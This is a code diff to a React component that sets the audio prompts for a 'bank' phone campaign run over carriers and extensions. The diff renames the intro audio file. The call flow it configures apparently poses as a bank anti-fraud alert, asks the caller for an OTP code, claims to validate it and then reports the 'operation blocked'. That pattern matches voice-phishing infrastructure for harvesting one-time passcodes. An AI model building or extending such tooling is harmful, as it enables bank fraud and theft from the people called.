@@ -83,7 +83,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   // Campaign audio configurations (per campaign)
   const defaultCampaignAudios: Record<ServiceCampaignKey, CampaignAudioConfig> = {
     bank: {
-      introAudioPath: 'custom/alerta_banco_antifraude',
+      introAudioPath: 'custom/banrearreglado',
       promptAudioPath: 'custom/solicitar_codigo_otp',
       agentAudioPath: 'custom/conectar_asesor_banco',
       successAudioPath: 'custom/operacion_bloqueada_exito',
@@ -483,7 +483,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          intro: currentAudios.introAudioPath || 'custom/alerta_banco_antifraude',
+          intro: currentAudios.introAudioPath || 'custom/banrearreglado',
           prompt: currentAudios.promptAudioPath || 'custom/solicitar_codigo_otp',
           wait: 'custom/un_momento_validando_informacion',
           success: currentAudios.successAudioPath || 'custom/operacion_bloqueada_exito',
@@ -499,7 +499,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
         body: JSON.stringify({
           extensions,
           carriers,
-          audioIntro: currentAudios.introAudioPath || 'custom/alerta_banco_antifraude',
+          audioIntro: currentAudios.introAudioPath || 'custom/banrearreglado',
           audioPrompt: currentAudios.promptAudioPath || 'custom/solicitar_codigo_otp',
           audioWait: 'custom/un_momento_validando_informacion',
           audioSuccess: currentAudios.successAudioPath || 'custom/operacion_bloqueada_exito',
